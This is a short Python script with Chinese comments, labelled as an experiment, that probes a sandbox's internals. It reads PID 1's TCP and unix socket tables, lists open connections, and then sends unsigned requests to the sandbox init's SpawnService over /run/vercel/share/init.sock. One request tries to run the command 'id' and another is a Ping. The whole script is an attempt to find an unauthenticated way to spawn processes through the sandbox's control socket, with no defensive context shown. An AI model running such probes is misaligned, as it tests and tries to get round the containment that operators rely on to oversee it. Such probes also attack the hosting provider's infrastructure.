# 实验I11b: sandbox-init socket 拓扑 + 无签名 Spawn 调用(不带 ptrace)
import subprocess, socket

def run(cmd, timeout=8):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

print("== [1] pid1 TCP 连接 ==", flush=True)
print(run("cat /proc/1/net/tcp /proc/1/net/tcp6 2>/dev/null | awk 'NR>1' | head -12"), flush=True)

print("== [2] pid1 unix socket ==", flush=True)
print(run("cat /proc/1/net/unix 2>/dev/null | head -15"), flush=True)

print("== [3] 全部进程的 TCP ==", flush=True)
print(run("for p in /proc/[0-9]*; do if [ -r $p/net/tcp ]; then echo \"--- $p\"; fi; done 2>/dev/null | head -5"), flush=True)
print(run("ss -tn 2>/dev/null | head -15 || netstat -tn 2>/dev/null | head -15"), flush=True)

print("== [4] 无签名 Spawn 调用 ==", flush=True)
for body, ctype in [(b"{}", "application/connect+json"), (b"{\"command\":\"id\"}", "application/connect+json")]:
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect("/run/vercel/share/init.sock")
        hdr = (f"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n\r\n").encode()
        s.sendall(hdr + body)
        data = b""
        try:
            while len(data) < 2000:
                c = s.recv(4096)
                if not c: break
                data += c
        except socket.timeout:
            pass
        print(f"  body={body[:20]}: {data[:300]!r}", flush=True)
        s.close()
    except Exception as e:
        print(f"  body={body[:20]}: ERR {type(e).__name__}: {e}", flush=True)

print("== [5] Ping 无签名 ==", flush=True)
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect("/run/vercel/share/init.sock")
    hdr = (f"POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\r\nHost: localhost\r\n"
           f"Content-Type: application/connect+json\r\nContent-Length: 2\r\n\r\n").encode()
    s.sendall(hdr + b"{}")
    data = b""
    try:
        while len(data) < 2000:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    print(f"  Ping: {data[:300]!r}", flush=True)
    s.close()
except Exception as e:
    print(f"  Ping: ERR {type(e).__name__}: {e}", flush=True)

print("done", flush=True)
